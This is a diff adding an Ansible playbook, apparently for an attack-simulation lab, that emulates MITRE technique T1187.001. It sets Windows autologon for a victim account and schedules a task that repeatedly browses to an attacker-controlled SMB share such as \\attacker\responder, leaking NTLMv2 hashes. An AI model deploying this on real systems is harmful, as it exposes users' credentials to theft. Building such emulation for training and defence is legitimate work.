@@ -1,0 +1,55 @@
+---
+# T1187.001 - Forced Authentication : NTLMv2 Response Give-away via SMB
+# Configures a scheduled task that browses to a specific share periodically in order to give-away a victim's NTLMv2 challenge-response hash.
+# Tested on Windows 2016. SCF DOES NOT WORK ON WINDOWS 10!!!!
+
+# Parameters:
+# path - A UNC path to browser to e.g. \\\\attacker\\responder
+# username - victim username to impersonate e.g. DYNAMIC\AUser
+# password - password for victim user e.g. secret123
+# interval - time in minutes between task triggers (e.g. 1)
+#
+# Example:
+#            { 
+#                name = "ATTCK_T1187_1"
+#                value = [
+#                    { 
+#                        path = "\\\\COMPUTER1\\SHARE",
+#                        username = "DYNAMIC\\user1",
+#                        password = "Password123",
+#                        interval = "1"
+#                    }
+#                ]
+#            }
+
+- name: Set autologon for user
+  community.windows.win_auto_logon:
+    username: "{{ item.username }}"
+    password: "{{ item.password }}"
+  register: autologon_result
+
+- name: Create 'T1187.001 - Forced Authentication NTLMv2 Response Give-away via SMB' scheduled task
+  community.windows.win_scheduled_task:
+    name: "SMB-Browser"
+    username: "{{ item.username }}"
+    password: "{{ item.password }}"
+    actions:
+    - path: taskkill.exe
+      arguments: "/IM explorer.exe /FI \"USERNAME eq {{ item.username }}\" /F "
+    - path: ping
+      arguments: "127.0.0.1"
+    - path: explorer.exe
+      arguments: "{{ item.path }}"
+    triggers:
+    - type: boot
+      repetition:
+        interval: "PT{{ item.interval }}M"
+    - type: registration
+      repetition:
+        interval: "PT{{ item.interval }}M"
+    multiple_instances: 3
+    logon_type: interactive_token
+
+- name: Reboot when Autologon changed
+  ansible.windows.win_reboot:
+  when: autologon_result.changed
